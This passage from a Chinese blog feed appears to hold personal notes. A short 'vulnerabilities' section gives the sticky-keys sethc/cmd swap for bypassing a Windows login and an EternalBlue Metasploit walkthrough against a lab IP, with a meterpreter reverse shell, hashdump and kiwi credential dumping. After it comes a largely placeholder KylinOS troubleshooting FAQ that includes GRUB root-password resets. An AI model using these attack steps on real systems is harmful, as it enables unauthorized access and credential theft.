写字板<span class="hljs-built_in">help</span> = command /? # 查看有什么命令<span class="hljs-built_in">color</span> <span class="hljs-number">0</span>a # 修改<span class="hljs-built_in">cmd</span>窗口颜色language-bat复制代码</code></pre><hr><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><hr><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="0001-5次shift漏洞"><a href="#0001-5次shift漏洞" class="headerlink" title="0001 5次shift漏洞"></a>0001 5次shift漏洞</h2><pre><code class="hljs bash"><span class="hljs-comment"># 唤醒程序路径：C:\Windows\System32\sethc</span><span class="hljs-comment"># 复现方法：先关机重启，看到windows图标，直接在VM上关闭客户机（模拟开机时断断电源操作），再重启虚拟机，一定要看到“启动启动修复（推荐）”，回车；取消还原，查看“隐藏问题详细信息”，打开“X:\windows\system32\zh-CN\erofflps.txt”，在记事本中文件&gt;打开，文件类型选择所有文件，将sethc修改为sethce，将cmd复制一份并修改为sethc，之后关闭窗口点击完成关机，再开机，点击用户登陆，按5次shift按键，在CMD窗口执行net user username &quot;&quot;，设置无密码即可登录。</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114649243.png" alt="sethc"></p><p>sethc</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114952907.png" alt="5次shift漏洞"></p><p>5次shift漏洞</p><h2 id="0002-永恒之蓝"><a href="#0002-永恒之蓝" class="headerlink" title="0002 永恒之蓝"></a>0002 永恒之蓝</h2><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sS -p 445 192.168.112.0/24 &gt; p_445<span class="hljs-built_in">cat</span> p_445 | grep -E <span class="hljs-string">&quot;Nmap|open&quot;</span><span class="hljs-comment"># </span>msfconsole  search ms17_010  use auxiliary/scanner/smb/smb_ms17_010  use exploit/windows/smb/ms17_010_eternalblue\    <span class="hljs-built_in">set</span> rhost 192.168.112.128 <span class="hljs-comment"># 设置靶机</span>    <span class="hljs-built_in">set</span> lhost 192.168.112.130 <span class="hljs-comment"># 设置本机IP</span>    <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    run <span class="hljs-comment"># 开始攻击</span><span class="hljs-comment">## 攻击成功后的操作</span>screenshot <span class="hljs-comment"># 截图</span>screenshare <span class="hljs-comment"># 实时监控屏幕</span><span class="hljs-comment"># 查看密码</span>hashdumpload kiwips -S <span class="hljs-string">&quot;csrss&quot;</span>migrate 344creds_allshell <span class="hljs-comment"># 登陆到win7</span>chcp 65001 <span class="hljs-comment"># 消除乱码</span>wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1 <span class="hljs-comment"># 远程</span>netstat -an <span class="hljs-comment"># 查看端口</span><span class="hljs-built_in">sudo</span> rdesktop 192.168.112.128 <span class="hljs-comment"># 发起远程</span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KylinOS FAQ</title>
      <link href="/2025/08/24/KylinOS-FAQ/"/>
      <url>/2025/08/24/KylinOS-FAQ/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>1、<a href="https://www.kdocs.cn/wo/sl/v329iVmr?app_id=3dZYNT1xersQT3xulOIsPs&R=L1MvMTI=">https://www.kdocs.cn/wo/sl/v329iVmr?app_id=3dZYNT1xersQT3xulOIsPs&amp;R=L1MvMTI=</a></p><p>2、打印机驱动查询连接 <a href="https://www.kdocs.cn/wo/sl/v329iVmr?app_id=3dZYNT1xersQT3xulOIsPs&R=L1MvMTI=">打印机驱动查询</a></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><pre><code class="hljs avrasm"><span class="hljs-symbol">x1000:</span> FAQ<span class="hljs-symbol">x2000:</span> 操作方法复制代码</code></pre><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><hr><h1 id="一、桌面"><a href="#一、桌面" class="headerlink" title="一、桌面"></a>一、桌面</h1><h2 id="11000-系统激活失败"><a href="#11000-系统激活失败" class="headerlink" title="11000 系统激活失败"></a>11000 系统激活失败</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs bash"><span class="hljs-comment"># 激活二维码无法生成问题，导致系统无法激活</span></code></pre><h3 id="问题解决方法"><a href="#问题解决方法" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs bash"><span class="hljs-comment">## 绑定授权权限：</span><span class="hljs-comment"># 1、微信搜索并关注公众号“麒麟软件”，聊天记录有一个“全链服务”，选产品激活</span><span class="hljs-comment"># 2、点开以后选“扫码激活权限管理”，使用产品授权证书里面的‘服务序列号’和‘验证码’以及其余的自定义信息进行权限绑定</span><span class="hljs-comment"># 3、此时微信已具有扫码激活权限</span><span class="hljs-comment">## 替换许可文件重新激活</span><span class="hljs-comment"># 1. 根据服务序列号导出 许可文件 &quot;info-xxxx.zip&quot; 【麒麟售后人员操作】；</span><span class="hljs-comment"># 2. 将许可文件解压到桌面，并在文件系统选项中勾选“显示隐藏文件”选项；</span><span class="hljs-comment"># 3. 在电脑属性的激活选项中，导入许可文件(LICENSE和.kyinfo文件)；</span><span class="hljs-comment"># 4. 重新打开电脑属性中的二维码激活，重新激活即可。</span></code></pre><h3 id="相关截图"><a href="#相关截图" class="headerlink" title="相关截图"></a>相关截图</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250911102124802.png" alt="11000-1"></p><p>11000-1</p><h2 id="11001-微信登录1203问题"><a href="#11001-微信登录1203问题" class="headerlink" title="11001 微信登录1203问题"></a>11001 微信登录1203问题</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs bash"><span class="hljs-comment"># 桌面系统联网情况下，安装了微信，扫码登录提示 1203 登录错误问题。</span></code></pre><h3 id="问题解决方法-1"><a href="#问题解决方法-1" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs bash"><span class="hljs-comment"># 重装激活相关组件，系统可以不激活。</span><span class="hljs-comment"># 联网情况下：更新源后执行下列命令重装激活相关组件</span><span class="hljs-built_in">sudo</span> apt install kylin-activation libkylin-activation</code></pre><h3 id="相关截图-1"><a href="#相关截图-1" class="headerlink" title="相关截图"></a>相关截图</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250824180723019.png" alt="微信1203登录失败"></p><p>微信1203登录失败</p><h2 id="11002-忘记密码"><a href="#11002-忘记密码" class="headerlink" title="11002 忘记密码"></a>11002 忘记密码</h2><h3 id="问题描述-2"><a href="#问题描述-2" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs bash"><span class="hljs-comment"># </span></code></pre><h3 id="问题分析过程"><a href="#问题分析过程" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-2"><a href="#问题解决方法-2" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs bash">single console=tty0 /sysroot/bin/sh rw rd.break<span class="hljs-comment">## Kylin 服务器忘记 root 密码</span><span class="hljs-comment"># 进主机单用户，修改root密码或者是开机用户的密码</span>1、重启主机，在选择界面按：e2、输入用户名：root    密码：Kylin1231233、然后找到linux或linux16行，ro改成rw，在audit=0后面或者security之前加：init=/bin/bash（注：如果是SP1需要多加一个 console=tty0 ）4、没有audit=0就在security之前加；然后：F10 或者 ctrl+x5、进入以后是命令行的模式，默认是root用户6、执行修改密码：passwd  root7、第一次输入密码回车（注：密码不显示，输入正确即可）8、第二次输入密码回车（注：密码跟第一次对不上会回到第一次输密码的情况。然后重新输两次）9、会显示成功的界面，显示这个单词了表示更改成功 Successfully9、然后输入 /sbin/reboot  -f 重启即可退出单用户</code></pre><h3 id="相关截图-2"><a href="#相关截图-2" class="headerlink" title="相关截图"></a>相关截图</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250911105610084.png" alt="中标V7桌面"></p><p>中标V7桌面</p><h2 id="11003-微信安装失败"><a href="#11003-微信安装失败" class="headerlink" title="11003 微信安装失败"></a>11003 微信安装失败</h2><h3 id="问题描述-3"><a href="#问题描述-3" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-1"><a href="#问题分析过程-1" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-3"><a href="#问题解决方法-3" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11004光驱无法识别"><a href="#11004光驱无法识别" class="headerlink" title="11004光驱无法识别"></a>11004光驱无法识别</h2><h3 id="问题描述-4"><a href="#问题描述-4" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-2"><a href="#问题分析过程-2" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-4"><a href="#问题解决方法-4" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs bash"><span class="hljs-comment"># 查看 cups服务和cups.socket</span><span class="hljs-comment"># 打印服务不可用：</span>systemctl <span class="hljs-built_in">enable</span> cups.socket --nowsystemctl <span class="hljs-built_in">enable</span> cups --now<span class="hljs-comment"># 查看状态:</span>systemctl status cupssystemctl <span class="hljs-built_in">enable</span> cups --now</code></pre><h2 id="11005-USB挂载只读"><a href="#11005-USB挂载只读" class="headerlink" title="11005 USB挂载只读"></a>11005 USB挂载只读</h2><h3 id="问题描述-5"><a href="#问题描述-5" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-3"><a href="#问题分析过程-3" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-5"><a href="#问题解决方法-5" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11006-安装安全套件网卡掉"><a href="#11006-安装安全套件网卡掉" class="headerlink" title="11006 安装安全套件网卡掉"></a>11006 安装安全套件网卡掉</h2><h3 id="问题描述-6"><a href="#问题描述-6" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-4"><a href="#问题分析过程-4" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-6"><a href="#问题解决方法-6" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11007-触屏双屏显示错误"><a href="#11007-触屏双屏显示错误" class="headerlink" title="11007 触屏双屏显示错误"></a>11007 触屏双屏显示错误</h2><h3 id="问题描述-7"><a href="#问题描述-7" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-5"><a href="#问题分析过程-5" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-7"><a href="#问题解决方法-7" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h3 id="相关截图-3"><a href="#相关截图-3" class="headerlink" title="相关截图"></a>相关截图</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250911103437245.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250911103536430.png" alt="img"></p><h2 id="11008-突然英文显示"><a href="#11008-突然英文显示" class="headerlink" title="11008 突然英文显示"></a>11008 突然英文显示</h2><h3 id="问题描述-8"><a href="#问题描述-8" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-6"><a href="#问题分析过程-6" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-8"><a href="#问题解决方法-8" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs bash"><span class="hljs-comment"># 服务器英文改中文：vi /etc/locale.conf，LANG的参数改成zh_CN.UTF-8</span><span class="hljs-comment"># 桌面系统英文改中文</span><span class="hljs-built_in">sudo</span> vim /etc/profile <span class="hljs-comment"># 添加以下内容</span><span class="hljs-built_in">export</span> LANG=zh_CN.UTF-8<span class="hljs-built_in">export</span> GDM_LANG=zh_CN<span class="hljs-built_in">export</span> LANGUAGE=zh_CN<span class="hljs-comment"># reboot 重启主机即可</span></code></pre><h2 id="11009-无法识别USB"><a href="#11009-无法识别USB" class="headerlink" title="11009 无法识别USB"></a>11009 无法识别USB</h2><h3 id="问题描述-9"><a href="#问题描述-9" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-7"><a href="#问题分析过程-7" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-9"><a href="#问题解决方法-9" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11010-系统启动慢问题"><a href="#11010-系统启动慢问题" class="headerlink" title="11010 系统启动慢问题"></a>11010 系统启动慢问题</h2><h3 id="问题描述-10"><a href="#问题描述-10" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs bash"><span class="hljs-comment"># 有光驱</span></code></pre><h3 id="问题分析过程-8"><a href="#问题分析过程-8" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="x-bash"><a href="#x-bash" class="headerlink" title="x bash"></a>x bash</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11011-屏幕分辨率无法设置"><a href="#11011-屏幕分辨率无法设置" class="headerlink" title="11011 屏幕分辨率无法设置"></a>11011 屏幕分辨率无法设置</h2><h3 id="问题描述-11"><a href="#问题描述-11" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs bash"><span class="hljs-comment"># </span></code></pre><h3 id="问题分析过程-9"><a href="#问题分析过程-9" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-10"><a href="#问题解决方法-10" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11012-搜狗输入法无法输入"><a href="#11012-搜狗输入法无法输入" class="headerlink" title="11012 搜狗输入法无法输入"></a>11012 搜狗输入法无法输入</h2><h3 id="问题描述-12"><a href="#问题描述-12" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-10"><a href="#问题分析过程-10" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-11"><a href="#问题解决方法-11" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11013-凯大师导致磁盘空间满"><a href="#11013-凯大师导致磁盘空间满" class="headerlink" title="11013 凯大师导致磁盘空间满"></a>11013 凯大师导致磁盘空间满</h2><h3 id="问题描述-13"><a href="#问题描述-13" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-11"><a href="#问题分析过程-11" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-12"><a href="#问题解决方法-12" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11014-系统使用中频繁突然锁屏"><a href="#11014-系统使用中频繁突然锁屏" class="headerlink" title="11014 系统使用中频繁突然锁屏"></a>11014 系统使用中频繁突然锁屏</h2><h3 id="问题描述-14"><a href="#问题描述-14" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-12"><a href="#问题分析过程-12" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题解决方法-13"><a href="#问题解决方法-13" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs">复制代码</code></pre><h2 id="11015-磁盘空间满导致无法登录"><a href="#11015-磁盘空间满导致无法登录" class="headerlink" title="11015 磁盘空间满导致无法登录"></a>11015 磁盘空间满导致无法登录</h2><h3 id="问题描述-15"><a href="#问题描述-15" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs">复制代码</code></pre><h3 id="问题分析过程-13"><a href="#问题分析过程-13" class="headerlink" title="问题分析过程"></a>问题分析过程</h3><pre><code class="hljs bash"><span class="hljs-comment"># ctrl+alt+f1进入tty1，使用以下查看空间利用情况</span><span class="hljs-built_in">df</span> -h<span class="hljs-comment"># 打开终端并进入 /var/log 目录下</span><span class="hljs-built_in">cd</span> /var/log<span class="hljs-comment"># 查看什么文件比较大</span><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">du</span> -sh *</code></pre><h3 id="问题解决方法-14"><a href="#问题解决方法-14" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs bash"><span class="hljs-comment"># 将相关文件（日志）被删了</span><span class="hljs-comment"># 空间未释放，可以执行以下命令</span>systemctl restart rsyslog<span class="hljs-comment"># 备注：可能需要重启一下电脑</span></code></pre><h3 id="相关截图如下"><a href="#相关截图如下" class="headerlink" title="相关截图如下"></a>相关截图如下</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250911101036233.png" alt="img"></p><h2 id="11016-开启审计的方法"><a href="#11016-开启审计的方法" class="headerlink" title="11016 开启审计的方法"></a>11016 开启审计的方法</h2><pre><code class="hljs bash">一、检查内核是否开启审计功能：grep  <span class="hljs-string">&quot;audit&quot;</span>  /etc/default/grub  ，audit=0表示未开启二、编辑文件：vi  /etc/default/grub ，将audit=0改成audit=1三、查找grub配置所在位置：find  /  -name  grub.cfg（结果应该为 /boot/grub2/grub.cfg）  （注：查出来是什么结果就是什么结果）四、备份：<span class="hljs-built_in">cp</span>  /boot/grub2/grub.cfg  /boot/grub2/grub.cfg-bak五、更新grub配置：grub2-mkconfig  -o  /boot/grub2/grub.cfg六、重启主机</code></pre><h2 id="11017-软件商店问题"><a href="#11017-软件商店问题" class="headerlink" title="11017 软件商店问题"></a>11017 软件商店问题</h2><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">sudo</span> apt update<span class="hljs-built_in">sudo</span> apt install --fix-broken<span class="hljs-built_in">sudo</span> apt install -f<span class="hljs-built_in">sudo</span> apt install -y kylin-software-center --reinstall<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> /var/lib/dpkg/updates/*<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> /var/lib/dpkg/lock<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> /var/lib/dpkg/lock-frontend<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> /var/cache/apt/archives/lock<span class="hljs-built_in">sudo</span> dpkg --configure -a<span class="hljs-built_in">sudo</span> apt update</code></pre><h2 id="桌面开机密码锁定问题"><a href="#桌面开机密码锁定问题" class="headerlink" title="桌面开机密码锁定问题"></a>桌面开机密码锁定问题</h2><pre><code class="hljs bash">进主机单用户，修改root密码或者是开机用户的密码1、重启主机，在选择界面按：e2、然后找到linux或linux16行，ro改成rw，在audit=0后面或者security之前加：init=/bin/bash console=tty03、没有audit=0就在security之前加；然后：F10 或者 ctrl+x4、进入以后是命令行的模式，默认是root用户5、删除缓存文件<span class="hljs-built_in">rm</span>   /var/log/tallylog.d/.*6、解锁用户pam_tally2    --user=[用户名]    --reset7、然后修改密码执行：<span class="hljs-built_in">echo</span>  <span class="hljs-string">&quot;用户名:密码&quot;</span>  |  chpasswd8、输入新的密码即可（输入两遍，密码是看不到字符显示的，必须两次输入正确）9、改完会看到一个成功的英文单词界面10、改完后输入：reboot  -f      就OK了注：改密码passwd  [用户名]，密码要有一定复杂度，注意大小写及不要用小键盘，建议先改xz123123然后进系统图形化再修改再执行passwd修改密码时一直显示账户锁定，需要su到那个普通用户直接执行passwd修改本身密码</code></pre><h2 id="输入法消失问题"><a href="#输入法消失问题" class="headerlink" title="输入法消失问题"></a>输入法消失问题</h2><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250911111448594.png" alt="img"></p><h2 id="共享文件夹永久挂载"><a href="#共享文件夹永久挂载" class="headerlink" title="共享文件夹永久挂载"></a>共享文件夹永久挂载</h2><pre><code class="hljs bash">mount.cifs  -o  username=用户名,password=密码,rw,uid=1000,gid=1000,dir_mode=0777,file_mode=0777,iocharset=utf8,vers=1.0  //共享IP/路径  /data/mount_point3、永久挂载vi  /etc/fstab//共享IP/路径  /data/mount_point  cifs  defaults,username=用户名,password=密码,rw,uid=1000,gid=1000,dir_mode=0777,file_mode=0777,iocharset=utf8,vers=1.0,_netdev  0 0</code></pre><h2 id="桌面自动休眠唤醒异常卡顿"><a href="#桌面自动休眠唤醒异常卡顿" class="headerlink" title="桌面自动休眠唤醒异常卡顿"></a>桌面自动休眠唤醒异常卡顿</h2><pre><code class="hljs bash">1.在桌面空白处鼠标右键，选择打开终端选项，打开终端窗口。2.在终端中执行如下命令来修复 .viminfo 文件权限：<span class="hljs-built_in">sudo</span>  <span class="hljs-built_in">chown</span>  <span class="hljs-variable">$USER</span>:<span class="hljs-variable">$USER</span>  /home/<span class="hljs-variable">$USER</span>/.viminfo</code></pre><h2 id="任务栏消失、桌面黑屏、鼠标跳动、图标异常、控制面板打不开等问题"><a href="#任务栏消失、桌面黑屏、鼠标跳动、图标异常、控制面板打不开等问题" class="headerlink" title="任务栏消失、桌面黑屏、鼠标跳动、图标异常、控制面板打不开等问题"></a>任务栏消失、桌面黑屏、鼠标跳动、图标异常、控制面板打不开等问题</h2><pre><code class="hljs bash"><span class="hljs-comment">###此步骤可以解决：任务栏消失、桌面黑屏、鼠标跳动、图标异常、控制面板打不开等问题###注：次步骤需要主机能访问互联网</span>1、开机进入用户登录界面（注：此时记住登录的用户名）2、按键盘的 ctrl+alt+F1 ，切换到命令登录模式3、依次输入用户名（输完按回车），密码（输完按回车）（注：输密码的时候不显示，实际输成功的）4、输入命令：<span class="hljs-built_in">sudo</span>  su ，再次输入开机密码（输完按回车）进入到root模式，（注：输密码的时候不显示，实际输成功的）5、输入命令：<span class="hljs-built_in">cd</span>  /home/用户名 ，此时进入用户的家目录6、删除缓存，输入命令：<span class="hljs-built_in">rm</span>  -rf  .cache  .config  .<span class="hljs-built_in">local</span>7、更新源，与修复系统，依次输入三个命令：apt  update，apt  install  -f，apt  autoremove(遇到确认输入y)8、重装桌面服务，老V10重装命令：apt  install  --reinstall  caja ，新V10-SP1重装命令：apt  install  --reinstall  peony9、重启桌面服务：systemctl  restart  lightdm10、登录即可解决问题</code></pre><h2 id="W515-L410-L420-990-9006c-忘记密码"><a href="#W515-L410-L420-990-9006c-忘记密码" class="headerlink" title="W515&#x2F;L410&#x2F;L420(990&#x2F;9006c)忘记密码"></a>W515&#x2F;L410&#x2F;L420(990&#x2F;9006c)忘记密码</h2><pre><code class="hljs bash"><span class="hljs-comment"># # https://www.xckfsq.com/question/show.html?id=35537</span><span class="hljs-comment"># 在第一个进入系统默认选项上面按一下英文字母 “ e”键(不要按多次) 进入grub 配置界面，进入界面后找到Linux 开头的那一行,从 security= 那里开始往前删,删到 ro 那里,打一个空格加上内容rw single console=tty init=/bin/bash</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915121813452.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915121750229.png" alt="img"></p><h2 id="开机进入BusyBox"><a href="#开机进入BusyBox" class="headerlink" title="开机进入BusyBox"></a>开机进入BusyBox</h2><h3 id="问题解决方法-15"><a href="#问题解决方法-15" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><pre><code class="hljs bash"><span class="hljs-comment">## 步骤一：输入exit检查回显结果</span><span class="hljs-comment"># 显示/dev/sdax 或者 /dev/mapper/kylin-vg-root 可以尝试使用步骤一的 fsck 修复</span><span class="hljs-comment"># 显示 alter! uuid 类似的错误，可能是硬盘物理错误（坏了/线松了）等，可能需要尝试进入开发盘，使用“系统修复助手”修复。</span><span class="hljs-comment"># 系统修复助手使用说明：https://docs.qq.com/doc/DTmVKbmxRbEpLd1Nx，</span><span class="hljs-comment"># 开发盘地址或使用下面地址进行下载 https://pan.baidu.com/s/1N1BgzN6Nqz2pRD4WvW9rOA?pwd=ufwl </span><span class="hljs-comment"># 步骤一：在此界面输入exit，如图二显示/dev/sda2，则执行以下修复命令。</span>fsck -y /dev/sda2<span class="hljs-comment"># 有些提示是/dev/mapper/kylin-vg-root，则执行以下修复命令。</span>fsck -y /dev/mapper/kylin-vg-root</code></pre><h3 id="相关截图-4"><a href="#相关截图-4" class="headerlink" title="相关截图"></a>相关截图</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912110442433.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912110610379.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912111124800.png" alt="img"></p><h2 id="桌面锁-清除"><a href="#桌面锁-清除" class="headerlink" title="桌面锁 清除"></a>桌面锁 清除</h2><h3 id="问题描述-16"><a href="#问题描述-16" class="headerlink" title="问题描述"></a>问题描述</h3><pre><code class="hljs bash">1.问题：做什么都要输入密码2.安装seahorse软件，可通过以上2-3-1脚本进行安装.3.安装完会打开如下图片</code></pre><h3 id="相关截图-5"><a href="#相关截图-5" class="headerlink" title="相关截图"></a>相关截图</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912113526395.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912113622019.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912113645513.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912113704247.png" alt="img"></p><hr><h2 id="12000-系统激活"><a href="#12000-系统激活" class="headerlink" title="12000 系统激活"></a>12000 系统激活</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="12001-软件商店安装软件"><a href="#12001-软件商店安装软件" class="headerlink" title="12001 软件商店安装软件"></a>12001 软件商店安装软件</h2><h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="12002-打印机驱动-配置"><a href="#12002-打印机驱动-配置" class="headerlink" title="12002 打印机驱动&amp;配置"></a>12002 打印机驱动&amp;配置</h2><h3 id="使用场景-2"><a href="#使用场景-2" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="12003-字体安装"><a href="#12003-字体安装" class="headerlink" title="12003 字体安装"></a>12003 字体安装</h2><h3 id="使用场景-3"><a href="#使用场景-3" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-3"><a href="#操作步骤-3" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs">复制代码</code></pre><h2 id="12004-下载其他架构的组件离线包"><a href="#12004-下载其他架构的组件离线包" class="headerlink" title="12004 下载其他架构的组件离线包"></a>12004 下载其他架构的组件离线包</h2><h3 id="使用场景-4"><a href="#使用场景-4" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-4"><a href="#操作步骤-4" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code class="hljs routeros">1.使用一台可以联网的麒麟系统，更新源后；2.使用命令apt-cache madison hplip:arm64 查看ARM架构的所有版本包；3.使用命令apt-<span class="hljs-built_in">get</span> download --print-uris <span class="hljs-attribute">hilip</span>=3.25.2.2查看对于版本的软件包下载地址；4.使用显示后的下载地址在浏览器上下载即可。<span class="hljs-comment"># 其他架构</span>复制代码</code></pre><h2 id="12005-打印Excel保留标题"><a href="#12005-打印Excel保留标题" class="headerlink" title="12005 打印Excel保留标题"></a>12005 打印Excel保留标题</h2><h3 id="使用场景-5"><a href="#使用场景-5" class="headerlink" title="使用场景"></a>使用场景</h3><pre><code class="hljs">复制代码</code></pre><h3 id="操作步骤-5"><a href="#操作步骤-5" class="headerlink" 